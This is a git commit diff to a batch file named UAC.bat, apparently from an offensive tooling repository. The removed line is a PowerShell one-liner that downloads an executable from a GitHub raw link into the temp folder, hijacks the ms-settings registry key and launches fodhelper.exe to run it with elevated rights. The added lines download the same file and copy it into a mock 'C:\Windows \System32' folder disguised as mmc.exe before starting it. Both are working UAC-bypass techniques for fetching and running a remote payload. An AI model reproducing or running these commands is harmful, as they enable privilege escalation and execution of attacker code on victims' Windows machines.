fed03a7d8bdc2fb1f5e44cec7f27ff9defdeea47
Shilpesh Trivedi <tshilpesh@gmail.com>
2020-09-03 16:23:20 +0530

    Update UAC.bat

--- UAC.bat
+++ UAC.bat
@@ -1,1 +1,3 @@
-powershell.exe Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/SakalaBoobBoon/blob/master/cmd.exe?raw=true -Destination "$env:TEMP\dos.exe"; Set-Location -Path "$env:TEMP"; New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name '(Default)' -Value "$env:TEMP\dos.exe" -Force; Start-Process "C:\Windows\System32\fodhelper.exe"
+powershell.exe Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/SakalaBoobBoon/blob/master/cmd.exe?raw=true -Destination "$env:TEMP\dos.exe";
+copy "C:\Users\%username%\dos.exe" "\\?\C:\Windows \System32\mmc.exe"
+Start "C:\Windows \System32\mmc.exe"
